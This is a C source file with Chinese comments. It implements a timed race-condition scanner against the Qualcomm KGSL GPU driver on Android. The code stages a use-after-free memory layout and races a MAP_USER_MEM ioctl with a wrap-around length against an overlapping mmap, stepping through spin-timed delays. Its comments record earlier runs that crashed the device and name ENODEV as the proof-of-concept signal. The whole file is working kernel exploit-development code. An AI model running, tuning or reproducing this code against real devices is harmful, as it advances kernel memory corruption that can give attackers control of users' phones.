 * k3_race_scan.c — 阶段 C：精确延时扫描（自旋同步，热路径零 I/O）
 *
 * 前一轮教训：
 *   1. usleep(200) 实际漂移 1.5–3.3 ms；每行日志的 fsync 占 1–3 ms，严重污染时序
 *   2. racer 的 MAP_USER_MEM 实测耗时 0.6–2.0 ms，窗口远宽于预期
 *   3. 同样的代码，主线程 mmap 晚到 → MISS(ENOMEM) 安全；早到/并发 → 设备崩溃
 *
 * 本程序对策：
 *   - 主线程用自旋（CLOCK_MONOTONIC 差值）等待，精度 ~µs
 *   - 竞速热路径只 write(2) 不 fsync；进入竞速前先 fsync 一条基线
 *   - 延时值由 argv 给出，逐个尝试；命中（ENODEV）或崩溃即停止
 *
 * 用法: k3_race_scan [delay_us ...]   缺省 0 50 100 200 400 800
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096
#define LOGPATH "/data/local/tmp/race_scan.log"

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002

#define UAF_START     0x00000007001ff000ULL
#define UAF_SIZE      0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL
#define WRAP_SIZE     0xffffffffffefd000ULL

static int fd = -1;
static int logfd = -1;

static double now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1e6 + ts.tv_nsec / 1e3;
}

/* 热路径：不 fsync */
static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;
	double t = now_us();

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%12.1f] %s\n", t, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void on_alarm(int s)
{
	(void)s;
	lg("WATCHDOG: 90s 超时");
	if (logfd >= 0)
		fsync(logfd);
	_exit(9);
}

struct race_state {
	volatile int ready;
	volatile int started;
	volatile long result;
	volatile int saved_errno;
	double t_enter, t_exit;
	uint64_t hostptr, len;
};

static void *racer(void *arg)
{
	struct race_state *rs = (struct race_state *)arg;
	struct kgsl_map_user_mem req;

	while (!rs->ready)
		__asm__ __volatile__("" ::: "memory");
	rs->started = 1;
	__sync_synchronize();

	memset(&req, 0, sizeof(req));
	req.fd = -1;
	req.len = rs->len;
	req.hostptr = rs->hostptr;
	req.memtype = KGSL_USER_MEM_TYPE_ADDR;
	req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;

	rs->t_enter = now_us();
	errno = 0;
	rs->result = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
	rs->saved_errno = errno;
	rs->t_exit = now_us();
	return NULL;
}

static int obj_alloc(uint64_t size, unsigned int *id, uint64_t *ms)
{
	struct kgsl_gpuobj_alloc al;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al))
		return -1;
	*id = al.id;
	*ms = al.mmapsize;
	return 0;
}

static int one_attempt(int delay_us, int idx)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	void *p, *bogus, *ph;
	struct race_state rs;
	pthread_t th;
	size_t k;
	int e;
	double t0;

	lg("--- attempt#%d delay=%dus ---", idx, delay_us);

	if (obj_alloc(UAF_SIZE, &uaf_id, &uaf_ms))
		return -1;
	if (obj_alloc(OVERLAP_SIZE, &ov_id, &ov_ms))
		return -1;

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED) {
		lg("UAF mmap FAIL errno=%d", errno);
		return -1;
	}
	((volatile char *)p)[0] = 1;
	((volatile char *)p)[uaf_ms - PAGE] = 1;
	for (k = 0; k + PAGE < uaf_ms; k += PAGE * 1024)
		((volatile char *)p)[k] = 1;
	munmap(p, (size_t)uaf_ms);

	bogus = mmap((void *)(uintptr_t)BOGUS_START, PAGE * 3,
		     PROT_READ | PROT_WRITE,
		     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if (bogus == MAP_FAILED) {
		lg("BOGUS mmap FAIL errno=%d", errno);
		return -1;
	}
	for (k = 0; k < 3; k++)
		((volatile char *)bogus)[k * PAGE] = 1;

	if (obj_alloc(PLACEH_SIZE, &ph_id, &ph_ms))
		return -1;
	ph = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
		  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
		  (off_t)ph_id << 12);
	if (ph == MAP_FAILED) {
		lg("PLACEHOLDER mmap FAIL errno=%d", errno);
		return -1;
	}
	((volatile char *)ph)[0] = 1;

	/* 竞速基线落盘，之后热路径不再 fsync */
	lg("geometry ready; 起 racer (delay=%d us)", delay_us);
	if (logfd >= 0)
		fsync(logfd);

	memset(&rs, 0, sizeof(rs));
	rs.hostptr = BOGUS_START;
	rs.len = WRAP_SIZE;
	rs.result = -1;
	if (pthread_create(&th, NULL, racer, &rs)) {
		lg("pthread_create FAIL");
		return -1;
	}
	rs.ready = 1;
	__sync_synchronize();
	while (!rs.started)
		__asm__ __volatile__("" ::: "memory");

	/* 自旋等待，精度 µs 级 */
	t0 = now_us();
	while (now_us() - t0 < (double)delay_us)
		__asm__ __volatile__("" ::: "memory");

	{
		double t_map_in = now_us();
		p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd,
			 (off_t)ov_id << 12);
		e = errno;
		lg("main mmap t_in=%.1f t_out=%.1f ret=%s errno=%d",
		   t_map_in, now_us(), p == MAP_FAILED ? "FAIL" : "OK", e);
		/* 立刻落盘：即使随后清理阶段崩溃，也保住竞速结果 */
		if (logfd >= 0)
			fsync(logfd);
	}
	pthread_join(th, NULL);
	lg("racer t_enter=%.1f t_exit=%.1f dur=%.0fus ret=%ld errno=%d",
	   rs.t_enter, rs.t_exit, rs.t_exit - rs.t_enter, rs.result,
	   rs.saved_errno);
	lg("overlaps_with_racer=%s",
	   (((double)delay_us) < (rs.t_exit - rs.t_enter)) ? "YES" : "NO");

	if (p != MAP_FAILED) {
		lg(">>> ANOMALY: overlap mmap 成功（正常应为 ENOMEM），停止扫描 <<<");
		if (logfd >= 0)
			fsync(logfd);
		_exit(0);
	} else if (e == ENODEV) {
		lg(">>> ENODEV(19)：PoC 判据，但本机内核 mmap 路径不产生该码 <<<");
		if (logfd >= 0)
			fsync(logfd);
		_exit(0);
	}

	munmap(ph, (size_t)ph_ms);
	munmap(bogus, PAGE * 3);
	{
		struct kgsl_gpuobj_free fr;
		memset(&fr, 0, sizeof(fr));
		fr.id = ov_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = ph_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
		fr.id = uaf_id;
		ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	}
	if (logfd >= 0)
		fsync(logfd);
	usleep(200000);
	return e;
}

int main(int argc, char **argv)
{
	int delays[16];
	int n = 0, i, last = -1;

	if (argc > 1) {
		for (i = 1; i < argc && n < 16; i++)
			delays[n++] = atoi(argv[i]);
	} else {
		int d[] = {0, 50, 100, 200, 400, 800};
		for (i = 0; i < 6; i++)
			delays[n++] = d[i];
	}

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	signal(SIGALRM, on_alarm);
	alarm(90);

	lg("===== race_scan start pid=%d n=%d =====", getpid(), n);
	if (logfd >= 0)
		fsync(logfd);

	fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (fd < 0) {
		lg("open FAIL errno=%d", errno);
		return 1;
	}

	for (i = 0; i < n; i++) {
		last = one_attempt(delays[i], i);
		if (last == -1)
			break;
	}
	lg("===== end (last errno=%d) =====", last);
	if (logfd >= 0)
		fsync(logfd);
	close(fd);
	return 0;
}
```
